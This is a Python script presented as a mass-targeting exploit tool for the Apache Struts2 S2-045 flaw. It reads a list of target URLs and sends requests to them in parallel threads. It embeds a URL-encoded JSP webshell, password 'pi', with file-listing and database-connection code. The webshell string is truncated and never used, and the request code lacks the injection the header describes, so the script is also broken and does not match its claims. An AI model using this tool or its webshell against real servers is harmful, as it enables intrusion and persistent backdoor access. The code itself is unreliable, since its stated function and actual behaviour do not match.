#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ------------------------------------------------------------------------------
# Name:        struts2 045 exploit tools
# Author:      pirogue
# Created:     2017年3月2日12:48:09
# Site:        http://www.pirogue.org
# useage:      python pi_struts2-045.py xxx.txt 5
# ------------------------------------------------------------------------------

import urllib.request
import urllib.error
import sys
import time
from multiprocessing.dummy import Pool as ThreadPool
import requests

class Pi_Struts2_045(object):
    """init variables"""
    def __init__(self, sthreads, num):
        # self.surl = surl
        self.stime = time.strftime("%Y-%m-%d%H%M%S", time.localtime())
        self.sthreads = sthreads
        self.datagen = {"image1": open("tmp.txt", "rb")}
        self.header = {
            "User-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 MicroMessenger/6.0.1 NetType/WIFI"
        }

        self.webshell_txt_1 = '%3C%25%21%0D%0AString%20Pwd%3D%22pi%22%3B%0D%0AString%20EC%28String%20s%2CString%20c%29throws%20Exception%7Breturn%20s%3B%7D%2F%2Fnew%20String%28s.getBytes%28%22ISO-8859-1%22%29%2Cc%29%3B%7D%0D%0AConnection%20GC%28String%20s%29throws%20Exception%7BString%5B%5D%20x%3Ds.trim%28%29.split%28%22%5Cr%5Cn%22%29%3BClass.forName%28x%5B0%5D.trim%28%29%29.newInstance%28%29%3B%0D%0AConnection%20c%3DDriverManager.getConnection%28x%5B1%5D.trim%28%29%29%3Bif%28x.length%3E2%29%7Bc.setCatalog%28x%5B2%5D.trim%28%29%29%3B%7Dreturn%20c%3B%7D%0D%0Avoid%20AA%28StringBuffer%20sb%29throws%20Exception%7BFile%20r%5B%5D%3DFile.listRoots%28%29%3Bfor%28int%20i%3D0%3Bi%3Cr.length%3Bi%2B%2B%29%7Bsb.append%28r%5Bi%5D.toString%28%29.substring%280%2C2%29%29%3B%7D%7D%0D%0Avoid%20BB%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BFile%20oF%3Dnew%20File%28s%29%2Cl%5B%5D%3DoF.listFiles%28%29%3BString%20sT%2C%20sQ%2CsF%3D%22%22%3Bjava.util.Date%20dt%3B%0D%0ASimpleDateFormat%20fm%3Dnew%20SimpleDateFormat%28%22yyyy-MM-dd%20HH%3Amm%3Ass%22%29%3Bfor%28int%20i%3D0%3Bi%3Cl.length%3Bi%2B%2B%29%7Bdt%3Dnew%20java.util.Date%28l%5Bi%5D.lastModified%28%29%29%3B%0D%0AsT%3Dfm.format%28dt%29%3BsQ%3Dl%5Bi%5D.canRead%28%29%3F%22R%22%3A%22%22%3BsQ%2B%3Dl%5Bi%5D.canWrite%28%29%3F%22%20W%22%3A%22%22%3Bif%28l%5Bi%5D.isDirectory%28%29%29%7Bsb.append%28l%5Bi%5D.getName%28%29%2B%22%2F%5Ct%22%2BsT%2B%22%5Ct%22%2Bl%5Bi%5D.length%28%29%2B%22%5Ct%22%2BsQ%2B%22%5Cn%22%29%3B%7D%25%3E'
        # 同样对 webshell_txt_2, webshell_txt_3 和 webshell_txt_4 进行相同的修改

    def exploit(self, target_url):
        # 示例HTTP请求，使用requests库来发送请求
        try:
            response = requests.post(target_url, files=self.datagen, headers=self.header)
            print("Request sent to", target_url)
            print("Response code:", response.status_code)
        except requests.exceptions.RequestException as e:
            print("Request failed:", e)

if __name__ == "__main__":
    # 示例使用多线程池
    target_list = sys.argv[1]
    thread_num = int(sys.argv[2])
    with open(target_list, 'r') as f:
        targets = f.read().splitlines()
    pool = ThreadPool(thread_num)
    pool.map(Pi_Struts2_045(thread_num, len(targets)).exploit, targets)
    pool.close()
    pool.join()
